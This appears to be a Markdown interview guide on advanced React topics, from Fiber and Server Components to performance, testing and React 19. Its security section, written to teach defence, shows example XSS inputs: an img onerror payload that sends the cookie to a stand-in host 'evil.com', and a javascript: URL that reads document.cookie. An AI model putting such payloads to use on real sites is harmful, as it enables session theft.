# React Advanced Interview Guide — 15 Years Experience

> Covers architecture, internals, patterns, performance, and production-grade decisions.
> Basic hooks/state/props are skipped — those are assumed known.

---

## 1. React Fiber Architecture — How Reconciliation Actually Works

**Q: Explain the React Fiber reconciler. What problem did it solve over the old stack reconciler?**

**Old stack reconciler (React <16):**
```
Component tree render = one synchronous, uninterruptible call stack
┌──────────────────────────────────────────────────────┐
│  renderApp()                                          │
│    → renderHeader()                                   │
│       → renderNav() → renderNavItem() × 20           │
│    → renderBody()                                     │
│       → renderList() → renderListItem() × 1000        │
│                                                       │
│  Total: 16ms budget × N components = FRAME DROPS      │
│  Browser can't interrupt — janky UI                   │
└──────────────────────────────────────────────────────┘
```

**Fiber reconciler (React 16+):**
```
Work is split into units called "fibers" — one per component
Each fiber = a JS object describing what to render

┌─────────────────────────────────────────────────────┐
│  FIBER NODE (simplified)                             │
│  {                                                   │
│    type: 'div' | MyComponent,                        │
│    stateNode: DOM node | instance,                   │
│    child: → first child fiber,                       │
│    sibling: → next sibling fiber,                    │
│    return: → parent fiber,                           │
│    pendingProps, memoizedProps,                      │
│    effectTag: UPDATE | PLACEMENT | DELETION,         │
│    lanes: priority bitmask                           │
│  }                                                   │
└─────────────────────────────────────────────────────┘

Two phases:
  RENDER PHASE (interruptible)          COMMIT PHASE (synchronous)
  ─────────────────────────             ──────────────────────────
  Walk fiber tree                       Apply all DOM mutations
  Compute diffs                         Run useLayoutEffect
  Mark effects (UPDATE/ADD/DEL)         Cannot be interrupted
  CAN PAUSE, RESUME, ABORT              Must be atomic
```

**Key insight for 15yr exp answer:** Fiber enables *time-slicing* — React can pause render work after each fiber unit if the browser needs to handle input, then resume. This is what enables Concurrent Mode.

---

## 2. Concurrent Mode & React 18 Features

**Q: What is Concurrent Mode? How does startTransition differ from useTransition?**

```
CONCURRENT MODE mental model:
─────────────────────────────
Without concurrent: renders are ALL-OR-NOTHING
  User types → entire re-render blocks input → laggy

With concurrent: renders have PRIORITY
  Urgent:     User input, clicks → immediate
  Transition: Navigation, filter, sort → deferrable

Priority lanes (simplified):
  SyncLane          → onClick, discrete events
  InputContinuousLane → typing, dragging
  DefaultLane        → normal setState
  TransitionLane     → startTransition
  IdleLane           → background work
```

```jsx
// startTransition — marks update as non-urgent (no isPending)
startTransition(() => {
  setFilter(newValue); // heavy re-render deferred
});

// useTransition — same + gives you isPending for loading UI
const [isPending, startTransition] = useTransition();
// isPending = true while the deferred render is in-flight

// useDeferredValue — defer a VALUE, not an updater
const deferredQuery = useDeferredValue(query);
// deferredQuery lags behind query — old UI shows while new renders
```

**When to choose which:**
```
startTransition    → you control the setState call
useDeferredValue   → you receive a prop/value you can't control
                     (e.g., from parent component)
```

---

## 3. React Server Components (RSC) — Architecture

**Q: Explain the RSC model. Where does rendering happen and why does it matter?**

```
TRADITIONAL CSR:
  Server → sends JS bundle → Browser downloads → Browser renders HTML
  Problem: waterfall, bundle size, no direct DB access from components

RSC MODEL:
  Components are either:
  ┌─────────────────────┐     ┌─────────────────────┐
  │  SERVER COMPONENT   │     │  CLIENT COMPONENT    │
  │  (default in Next13)│     │  ('use client')      │
  │                     │     │                      │
  │  Runs on server     │     │  Runs in browser     │
  │  Zero JS to client  │     │  Has JS bundle cost  │
  │  Can await DB/API   │     │  Has useState/effects│
  │  No hooks           │     │  Has event handlers  │
  │  No browser APIs    │     │  Interactive         │
  └─────────────────────┘     └─────────────────────┘

RULE: Server components CAN contain client components
      Client components CANNOT contain server components
      (except via children prop — passes as opaque reference)

BENEFIT:
  Product page with 50 components → only 3 need interactivity
  → 47 server components = ZERO JS shipped for them
  → 3 client components = only their code goes to browser
```

**Architecture decision question:** "When would you NOT use RSC?"
- Highly dynamic, real-time UI (WebSocket, presence)
- Existing SPA with complex client-side routing
- Teams unfamiliar with mental model — coordination cost

---

## 4. State Management at Scale

**Q: How do you choose between Context, Zustand, Redux Toolkit, Jotai, React Query?**

```
DECISION MATRIX:
─────────────────────────────────────────────────────────────────
Use Case                    │ Recommended Tool
────────────────────────────┼────────────────────────────────────
Shared UI state (theme,     │ Context + useReducer
locale, auth status)        │ — small, few updates
────────────────────────────┼────────────────────────────────────
Complex client state with   │ Zustand or Redux Toolkit
many slices, devtools,      │ — normalized store, time-travel
undo/redo                   │
────────────────────────────┼────────────────────────────────────
Server state (async,        │ React Query / TanStack Query
caching, refetch, stale)    │ — cache invalidation built-in
                            │ — DO NOT put server data in Redux
────────────────────────────┼────────────────────────────────────
Fine-grained atom-level     │ Jotai or Recoil
subscriptions (spreadsheet, │ — only components using that atom
real-time cells)            │   re-render
────────────────────────────┼────────────────────────────────────
Form state                  │ React Hook Form
                            │ — uncontrolled, minimal re-renders
─────────────────────────────────────────────────────────────────
```

**Senior answer on Context performance trap:**
```
Context pitfall — every consumer re-renders when ANY value changes:

// BAD — one object in context
const AppContext = createContext({ user, theme, notifications });
// Any update to notifications re-renders user-only consumers

// FIX 1 — split contexts by update frequency
const UserContext   = createContext(user);
const ThemeContext  = createContext(theme);
const NotifContext  = createContext(notifications);

// FIX 2 — use useMemo to stabilize context value
const value = useMemo(() => ({ user, updateUser }), [user]);
```

---

## 5. Performance Optimization — Advanced

**Q: You have a 10,000 row table that re-renders slowly. Walk me through your approach.**

```
PROFILING FIRST — never optimize blind:
  1. React DevTools Profiler → find which components take >16ms
  2. Chrome Performance tab → find JS long tasks
  3. why-did-you-render library → find unexpected re-renders

SOLUTIONS (in order of invasiveness):
────────────────────────────────────────────────────────
1. Virtualization (react-window / react-virtual)
   Only render visible rows + buffer
   10,000 rows → ~30 DOM nodes at any time
   
2. React.memo on row component
   Only re-renders if that row's data changes
   
3. useMemo for expensive derived data
   const sortedData = useMemo(() => sort(data), [data, sortKey]);
   
4. State colocation — move state DOWN
   Don't keep row-level state in top component
   
5. Pagination or infinite scroll
   Don't load 10,000 rows at once

6. Web Workers for sort/filter computation
   Move heavy computation off main thread
```

**Q: What is the difference between useCallback and useMemo? When does neither help?**

```
useMemo    → memoizes RESULT of function   (value)
useCallback → memoizes the FUNCTION itself (reference)

// useCallback is useless unless:
// 1. Passed to React.memo child   (prevents re-render)
// 2. In useEffect dependency array (prevents infinite loops)
// 3. Passed to expensive hooks

// Common mistake — useCallback that achieves nothing:
const handler = useCallback(() => doSomething(), []);
// If handler is not passed to memo child or effect deps,
// this adds cost with zero benefit.

// Rule: profile first, memoize second.
```

---

## 6. Design Patterns — Senior Level

**Q: Compare Compound Components vs Render Props vs HOC. When do you use each?**

```
COMPOUND COMPONENTS — share implicit state via Context
─────────────────────────────────────────────────────
// Flexible, controlled externally, idiomatic 2023+
<Select>
  <Select.Trigger />
  <Select.Options>
    <Select.Option value="a">Option A</Select.Option>
  </Select.Options>
</Select>

// Internal: Select provides context { selected, onChange }
// Children consume it — no prop drilling

USE WHEN: UI library components (Tabs, Accordion, Select, Modal)

────────────────────────────────────────────────────────────────
RENDER PROPS — pass rendering logic as a function prop
────────────────────────────────────────────────────────────────
<DataFetcher url="/api/users">
  {({ data, loading, error }) => (
    loading ? <Spinner /> : <UserList data={data} />
  )}
</DataFetcher>

// Good for: logic sharing when structure must vary
// Replaced mostly by: custom hooks (cleaner)
// Still valid for: renderItem in lists, react-window, react-table

────────────────────────────────────────────────────────────────
HOC — wraps component, adds behavior
────────────────────────────────────────────────────────────────
const AuthenticatedRoute = withAuth(MyPage);
// Useful for: cross-cutting concerns (analytics, auth guards)
// Problem: prop name collisions, hard to debug (wrapper hell)
// Prefer custom hooks over HOC in new code
```

---

## 7. Error Boundaries

**Q: Error boundaries — how do they work, what do they NOT catch?**

```
Error Boundary = class component that implements:
  static getDerivedStateFromError(error) → update state to show fallback
  componentDidCatch(error, info)         → log to Sentry/Datadog

What they CATCH:                  What they DON'T catch:
─────────────────────────         ────────────────────────────────
Errors during render              Event handlers (use try/catch)
Errors in lifecycle methods       Async code (setTimeout, promises)
Errors in child component tree    SSR errors
                                  Errors in the boundary itself

// Pattern for async error catching:
const [error, setError] = useState(null);
if (error) throw error; // push into boundary
somePromise.catch(e => setError(e));

// React 19: use() hook — suspense-compatible promise handling
const data = use(promise); // throws to nearest Suspense/ErrorBoundary
```

**Production pattern:** Every route should have an Error Boundary with user-visible fallback and Sentry logging. Granular boundaries (card level) give better UX than one top-level catch-all.

---

## 8. Code Splitting & Bundle Optimization

**Q: How do you architect code splitting in a large React app?**

```
LEVELS OF SPLITTING:
─────────────────────────────────────────────────────
1. Route-level (always do this)
   const Dashboard = lazy(() => import('./pages/Dashboard'));
   // Each route = separate chunk
   // 300KB app → 10 routes → ~30KB each, only one loaded at a time

2. Component-level (heavy components)
   const RichTextEditor = lazy(() => import('./components/Editor'));
   // Only loaded when user needs editor
   // Wrap in Suspense with fallback

3. Vendor splitting (webpack/vite config)
   // react + react-dom → one chunk
   // lodash, date-fns, chart-library → separate chunks
   // Caching: vendor chunk rarely changes → long cache TTL

4. Feature flags + dynamic import
   if (featureFlag.enabled) {
     const { FeatureX } = await import('./FeatureX');
   }

WHAT TO MEASURE:
  Bundle Analyzer → find what's in your JS
  LCP, FCP, TTI → real user impact
  Core Web Vitals → business impact

COMMON MISTAKE:
  Lazy loading components that are immediately visible on page load
  → causes layout shift and worse LCP
  → only lazy-load things NOT in initial viewport
```

---

## 9. Micro-Frontend Architecture

**Q: How would you split a large React app into micro-frontends?**

```
APPROACHES:
───────────────────────────────────────────────────────────────
1. Module Federation (Webpack 5 / Rspack)
   ┌─────────────┐    ┌──────────────┐    ┌──────────────┐
   │  Shell App  │    │  MFE: Orders │    │  MFE: Catalog│
   │  (host)     │◄───│  (remote)    │    │  (remote)    │
   │  Routing    │    │  /orders/**  │    │  /catalog/** │
   │  Auth       │    │  Own deploy  │    │  Own deploy  │
   └─────────────┘    └──────────────┘    └──────────────┘
   Shared: react, react-dom (singleton), design system
   Each MFE: independent repo, CI/CD, team

2. iframes
   + Hard isolation, independent deploys, any tech stack
   - Bad UX, performance, communication is complex

3. NPM packages (monorepo)
   + Simple, type-safe, shared tooling
   - Build coupling — change in one = rebuild all
   - Not truly independent deploys

HARD PROBLEMS with MFE:
  - Shared state (use URL params, custom events, or pub/sub)
  - Consistent styling (design tokens, CSS variables)
  - Auth propagation (shared cookie / token in shell)
  - React version mismatch (Module Federation handles via scopes)
```

---

## 10. Testing Strategy at Scale

**Q: Describe your testing pyramid for a large React app.**

```
        /\
       /E2E\         ← few (5-20), critical user flows only
      /──────\          Cypress / Playwright
     /Integr. \      ← moderate (50-200), component + API together
    /────────────\      React Testing Library + MSW (mock service worker)
   / Unit Tests  \   ← many (200+), pure functions, hooks, utils
  ────────────────      Jest + Testing Library

WHAT DESERVES INTEGRATION TEST (RTL + MSW):
  - Full form submit flow (validation → API → success state)
  - Auth-protected route behavior
  - Complex state machine (wizard/checkout)

WHAT DESERVES UNIT TEST:
  - Custom hooks (renderHook from testing-library)
  - Pure utility functions (formatters, validators)
  - Reducers (they're just functions)

WHAT NOT TO TEST:
  - Implementation details (internal state, private methods)
  - Snapshot tests of large components (brittle, no signal)
  - Third-party library behavior

MOCK STRATEGY:
  MSW (Mock Service Worker) > axios-mock-adapter > jest.mock
  MSW intercepts at network level — tests closer to reality
```

---

## 11. React Query / TanStack Query — Advanced

**Q: How does React Query's cache invalidation work? When would you use optimistic updates?**

```
CACHE LIFECYCLE:
  fresh → stale (after staleTime) → background refetch
  ┌──────────────────────────────────────────────────┐
  │ queryClient.invalidateQueries({ queryKey: [..] }) │
  │   → marks queries as stale                        │
  │   → if component mounted → immediate refetch      │
  │   → if unmounted → refetch on next mount          │
  └──────────────────────────────────────────────────┘

WHEN TO USE OPTIMISTIC UPDATES:
  ✓ Low latency, high confidence operations (like/unlike, reorder)
  ✓ Bad network conditions — user needs immediate feedback
  ✗ Financial transactions — never optimistic
  ✗ Complex server-side validation — wait for response

// Optimistic update pattern:
const mutation = useMutation({
  mutationFn: updateTodo,
  onMutate: async (newTodo) => {
    await queryClient.cancelQueries({ queryKey: ['todos'] });
    const previous = queryClient.getQueryData(['todos']);
    queryClient.setQueryData(['todos'], old => [...old, newTodo]); // optimistic
    return { previous }; // rollback context
  },
  onError: (err, newTodo, context) => {
    queryClient.setQueryData(['todos'], context.previous); // rollback
  },
  onSettled: () => {
    queryClient.invalidateQueries({ queryKey: ['todos'] }); // sync with server
  },
});
```

---

## 12. TypeScript + React — Advanced Patterns

**Q: How do you type a generic component? Polymorphic components?**

```typescript
// Generic component — type flows through
interface ListProps<T> {
  items: T[];
  renderItem: (item: T) => React.ReactNode;
  keyExtractor: (item: T) => string;
}

function List<T>({ items, renderItem, keyExtractor }: ListProps<T>) {
  return <ul>{items.map(i => <li key={keyExtractor(i)}>{renderItem(i)}</li>)}</ul>;
}
// Usage infers T automatically — no manual type annotation needed
<List items={users} renderItem={u => u.name} keyExtractor={u => u.id} />

// Polymorphic component — "as" prop pattern
type PolymorphicProps<C extends React.ElementType> = {
  as?: C;
  children: React.ReactNode;
} & React.ComponentPropsWithoutRef<C>;

function Box<C extends React.ElementType = 'div'>({ as, ...props }: PolymorphicProps<C>) {
  const Component = as ?? 'div';
  return <Component {...props} />;
}
// <Box as="button" onClick={...} />  → gets button props
// <Box as="a" href="..." />          → gets anchor props
```

---

## 13. Security in React

**Q: What React-specific security vulnerabilities do you watch for?**

```
1. XSS via dangerouslySetInnerHTML
   // BAD
   <div dangerouslySetInnerHTML={{ __html: userInput }} />
   // If userInput = '<img src=x onerror="fetch(evil.com/'+cookie+')">'
   
   // FIX: DOMPurify before rendering
   import DOMPurify from 'dompurify';
   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

2. XSS via href injection
   // BAD
   <a href={user.profileUrl}>Profile</a>
   // If profileUrl = 'javascript:alert(document.cookie)'
   
   // FIX: validate protocol
   const safeUrl = url.startsWith('https://') ? url : '#';

3. JSON injection in SSR (script tag XSS)
   // BAD — in Next.js/SSR
   <script>window.__DATA__ = {JSON.stringify(serverData)}</script>
   // If serverData contains </script> → breaks out of script tag
   
   // FIX: use JSON.stringify with replacer or use next/script with strategy

4. Dependency vulnerabilities
   npm audit → run in CI, fail on high severity
   Dependabot / Snyk for automated PRs

5. Sensitive data in localStorage
   Never store JWT refresh tokens in localStorage
   Use HTTP-only cookies (server sets them, JS can't read)
```

---

## 14. Accessibility (a11y) — What Interviewers Test Senior Devs On

**Q: Beyond alt text — what a11y patterns do you implement in React?**

```
FOCUS MANAGEMENT:
  // Modal: trap focus inside, return focus on close
  useEffect(() => {
    const firstFocusable = modal.querySelector('button, a, input');
    firstFocusable?.focus();
    return () => triggerRef.current?.focus(); // restore on unmount
  }, []);

ARIA LIVE REGIONS — announce dynamic content to screen readers:
  <div aria-live="polite" aria-atomic="true">
    {statusMessage} {/* Changes here announced without focus */}
  </div>

KEYBOARD NAVIGATION for custom components:
  // Custom dropdown — arrow keys move focus
  onKeyDown={(e) => {
    if (e.key === 'ArrowDown') focusNext();
    if (e.key === 'ArrowUp') focusPrev();
    if (e.key === 'Escape') closeDropdown();
    if (e.key === 'Enter') selectCurrent();
  }}

SEMANTIC HTML over div soup:
  <button> for actions (not <div onClick>)
  <a href> for navigation
  <nav>, <main>, <header>, <aside> landmarks
  Headings hierarchy (h1 → h2 → h3, never skip)

TESTING a11y:
  jest-axe — automated checks in unit tests
  axe DevTools browser extension — manual audit
  Screen reader testing (NVDA/VoiceOver) — can't automate this
```

---

## 15. Senior Trap Questions

**Q: When would you NOT use React?**

```
Good answers show architectural judgment:
  ✓ Simple static content site → Astro / 11ty / plain HTML
  ✓ Content-heavy blog with minimal interactivity → Astro
  ✓ Real-time collaborative app → might need SolidJS (fine-grained reactivity)
  ✓ Performance-critical game/canvas → direct canvas API, no virtual DOM
  ✓ Small widget embedded in non-React app → Web Components
```

**Q: React re-renders — name 5 causes and which are preventable.**

```
CAUSE                           PREVENTABLE?
──────────────────────────────────────────────────────
1. setState called in component       No (desired behavior)
2. Parent re-renders                  Yes — React.memo on child
3. Context value changes              Yes — split context / stable ref
4. New function/object prop ref       Yes — useCallback / useMemo
5. useEffect dep that always changes  Yes — fix dep comparison / useMemo
6. forceUpdate / key change           Sometimes — audit key logic
```

**Q: How does React's key prop work internally, and what happens when you use random keys?**

```
key = identity hint to the reconciler

Same key across renders → reconciler UPDATES existing DOM node
New key → reconciler DESTROYS old node, MOUNTS fresh one

// Destroying + recreating = expensive, but sometimes WANTED:
<UserProfile key={userId} />  // force fresh mount when user changes
                              // clears local state, useEffects re-run

// NEVER use random keys:
items.map(i => <Item key={Math.random()} />)
// Every render → all keys different → destroy all → remount all
// 10x performance hit + all state lost
```

**Q: What is the "stale closure" problem and how do you solve it?**

```
PROBLEM:
  function Timer() {
    const [count, setCount] = useState(0);
    useEffect(() => {
      const id = setInterval(() => {
        setCount(count + 1); // captures count=0 at mount time
      }, 1000);              // ALWAYS sets to 0+1 = 1, never increments
      return () => clearInterval(id);
    }, []); // empty deps — closure never updates
  }

SOLUTIONS:
  // 1. Functional update — doesn't read stale count
  setCount(prev => prev + 1); // ✅ reads current state from React

  // 2. useRef for mutable latest value
  const countRef = useRef(count);
  countRef.current = count; // always fresh
  setInterval(() => setCount(countRef.current + 1), 1000);

  // 3. Include in deps (triggers new interval — sometimes correct)
  useEffect(() => { ... }, [count]);
```

---

## 16. React 19 — What's New

```
KEY ADDITIONS (React 19, stable 2024):
───────────────────────────────────────────────────────
1. use() hook — unwrap promises and context in render
   const data = use(fetchDataPromise); // suspends if pending
   const ctx = use(MyContext);         // same as useContext

2. Server Actions — async functions that run on the server
   async function saveForm(formData) {
     'use server';
     await db.save(formData.get('name'));
   }
   <form action={saveForm}>...</form>

3. useFormStatus() — pending state for parent form submission
   const { pending } = useFormStatus();
   <button disabled={pending}>Submit</button>

4. useOptimistic() — replaces the useMutation onMutate pattern
   const [optimisticTodos, addOptimisticTodo] = useOptimistic(todos);

5. ref as prop — no more forwardRef needed
   function Input({ ref, ...props }) { return <input ref={ref} {...props} /> }

6. Document metadata — <title>, <meta> anywhere, React hoists to <head>
   <title>My Page</title> anywhere in component tree → works in SSR
```

---

## 17. Architecture Decision — Quick Reference

| Scenario | Recommended Decision |
|---|---|
| Need to share state 2 levels deep | Props or lifted state |
| Need to share state app-wide (theme, auth) | Context |
| Need to share server data (async, caching) | React Query |
| Need complex client state with devtools | Zustand or RTK |
| Component renders too often | React.memo + profile first |
| Page bundle too large | Route-level code splitting |
| Form with 50 fields | React Hook Form (uncontrolled) |
| Team of 20+ sharing one app | Micro-frontends / Module Federation |
| SEO-critical marketing pages | Next.js SSG or RSC |
| Real-time dashboard, high update rate | Fine-grained store (Jotai) |

---

## 18. Production Debugging Flow

```
SYMPTOM: "React app is slow in production"

STEP 1 — Identify category
  Slow initial load?  → Bundle size, SSR, CDN
  Slow interactions?  → Re-renders, JS execution
  Slow data?          → Network, server response

STEP 2 — Tools
  Lighthouse (CI) → LCP, TBT, CLS scores
  React Profiler  → component render counts + duration
  Chrome Perf tab → JS execution flame graph
  Bundle Analyzer → what's in the JS

STEP 3 — Common culprits in large React apps
  ✗ No virtualization for large lists
  ✗ Untracked Context re-renders (use React DevTools highlight)
  ✗ useEffect fetching in child causing waterfall
  ✗ Importing entire lodash/moment instead of tree-shaking
  ✗ Images not lazy-loaded, wrong format (use WebP, next/image)
  ✗ No Suspense boundaries — entire page waits for slowest fetch
```

---

## One-Page Cheat Sheet

```
INTERNALS:         Fiber = unit of work, enables time-slicing + priorities
CONCURRENT:        startTransition (non-urgent) / useDeferredValue (value lag)
RSC:               Server = zero JS, Client = interactive — choose per component
STATE RULES:       Server state → React Query | Client → Zustand | UI → Context
PERFORMANCE:       Profile first → virtualize → memoize → split
PATTERNS:          Compound Components (2023+) > HOC > Render Props
SECURITY:          DOMPurify for HTML | validate href protocols | HTTP-only cookie
TESTING:           RTL+MSW (integration) > custom hook tests > utils unit tests
STALE CLOSURE:     Use functional update (setX(prev => ...)) in intervals/events
KEYS:              Same key = update DOM, new key = destroy+remount, never random
```
